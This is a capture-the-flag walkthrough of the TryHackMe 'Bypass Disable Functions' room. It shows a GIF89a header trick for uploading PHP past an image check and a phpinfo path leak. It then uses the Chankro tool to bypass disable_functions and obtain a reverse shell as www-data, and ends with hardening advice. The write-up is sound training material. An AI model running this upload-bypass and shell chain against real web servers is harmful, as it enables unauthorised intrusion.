# TryHackMe - Bypass Disable Functions Walkthrough

## Challenge Information

| Category   | Value                                                |
| ---------- | ---------------------------------------------------- |
| Platform   | TryHackMe                                            |
| Challenge  | Bypass Disable Functions                             |
| Difficulty | Easy                                                 |
| Type       | Web Exploitation / PHP Security Misconfiguration     |
| Focus      | PHP Upload Bypass, Chankro, Disable_Functions Bypass |

---

# Scenario

This challenge focuses on bypassing PHP security restrictions, specifically the `disable_functions` directive commonly configured in hardened PHP environments.

We are introduced to a tool called **Chankro**, which is designed to bypass both:

* `disable_functions`
* `open_basedir`

Chankro works by generating a PHP dropper that uploads a malicious shared object library (`.so`) and executes arbitrary commands by abusing allowed PHP functions such as:

```text
putenv()
mail()
```

This allows attackers to achieve command execution even when common functions like:

```text
system()
exec()
shell_exec()
passthru()
```

are disabled.

---

# About Chankro

Installation:

```bash
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --help
```

Example Usage:

```bash
python2 chankro.py \
--arch 64 \
--input c.sh \
--output tryhackme.php \
--path /var/www/html
```

Parameters:

```text
--arch     Victim architecture (32 or 64)
--input    Payload file
--output   Generated PHP dropper
--path     Absolute upload location
```

---

# Enumeration

## Target Information

```text
Main IP :: 10.48.155.29
```

---

# Nmap Scan

Initial port scan:

```text
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP are exposed.

---

# Service Enumeration

Version scan results:

```text
22/tcp open  OpenSSH 7.2p2 Ubuntu
80/tcp open  Apache 2.4.18
```

Website Title:

```text
Ecorp - Jobs
```

This suggests a recruitment or CV submission portal.

---

# Web Application Analysis

Opening the website in Burp Suite and inspecting the application revealed a file upload feature intended for job applicants.

Reviewing the page source exposed:

```text
cv.php
```

which appeared to process uploaded files.

Since the challenge revolves around bypassing PHP restrictions, the upload functionality became the primary attack surface.

---

# Initial Upload Bypass

A standard PHP reverse shell was prepared.

To bypass validation checks requiring an image upload, a GIF magic header was prepended:

```php
GIF89a;
<?php
// php reverse shell
```

Request:

```http
Content-Disposition: form-data; name="file"; filename="h.php"
Content-Type: image/jpeg
```

The upload was accepted successfully.

This confirmed weak file validation.

---

# Directory Enumeration

Running Gobuster revealed additional resources:

```text
/phpinfo.php
/uploads
```

---

# PHP Information Disclosure

Accessing:

```text
/phpinfo.php
```

provided valuable environment information.

Most important finding:

```text
DOCUMENT_ROOT

/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
```

This path is required for Chankro to generate a working payload.

---

# Generating the Chankro Payload

A reverse shell script was prepared:

```bash
c.sh
```

Generating the payload:

```bash
python2 chankro.py \
--arch 64 \
--input c.sh \
--output h.php \
--path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
```

Output:

```text
-=[ Chankro ]=-
-={ @TheXC3LL }=-

[+] Binary file: c.sh
[+] Architecture: x64
[+] Final PHP: h.php

[+] File created!
```

Chankro automatically generated:

* Malicious PHP dropper
* Shared object library
* Payload execution mechanism

---

# Uploading the Chankro Payload

Using the same image-upload bypass technique, the generated payload was uploaded successfully.

Once accessed, the payload bypassed the PHP restrictions and executed the reverse shell.

---

# Gaining Initial Access

Listener:

```bash
nc -lvnp 4444
```

Connection received:

```text
Connection received on 10.48.155.29

www-data@ubuntu:/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads$
```

We now have command execution as:

```text
www-data
```

---

# User Enumeration

Exploring the system revealed the challenge flag.

```bash
cat flag.txt
```

Output:

```text
thm{bypass_d1sable_functions_1n_php}
```

---

# Flag

```text
thm{bypass_d1sable_functions_1n_php}
```

---

# Attack Chain

```text
File Upload Function
          ↓
Weak File Validation
          ↓
PHP Upload Bypass (GIF89a)
          ↓
phpinfo() Disclosure
          ↓
DOCUMENT_ROOT Discovery
          ↓
Chankro Payload Generation
          ↓
Payload Upload
          ↓
Disable_Functions Bypass
          ↓
Reverse Shell Execution
          ↓
www-data Access
          ↓
Flag Retrieval
```

---

# Key Findings

### Vulnerable Upload Function

The application accepted files containing:

```php
GIF89a;
<?php
```

allowing PHP code execution while appearing to be an image.

### Information Disclosure

The exposed:

```text
phpinfo.php
```

revealed sensitive environment details including the web root directory.

### PHP Security Bypass

Although dangerous PHP functions were disabled, Chankro successfully bypassed restrictions through:

```text
putenv()
mail()
```

allowing arbitrary command execution.

### Successful Remote Code Execution

The combination of:

* File upload
* Information disclosure
* Chankro payload generation

resulted in full remote command execution.

---

# Security Recommendations

### Secure File Uploads

Validate:

* MIME type
* File signatures
* File extensions

and store uploads outside the web root.

### Remove phpinfo()

Never leave:

```text
phpinfo.php
```

accessible on production systems.

### Restrict Upload Execution

Uploads should never be executable by the web server.

### Harden PHP

In addition to:

```text
disable_functions
```

implement:

* AppArmor
* SELinux
* Container isolation
* Proper filesystem permissions

### Web Application Firewall

A WAF could detect and block suspicious upload attempts.

---

# Conclusion

This challenge demonstrates why relying solely on PHP's `disable_functions` directive is insufficient for security. Through a vulnerable upload mechanism and an exposed `phpinfo()` page, it was possible to leverage Chankro to bypass PHP execution restrictions and obtain a shell as the web server user. The exercise highlights the importance of defense-in-depth, secure file upload handling, and minimizing information disclosure within web applications.
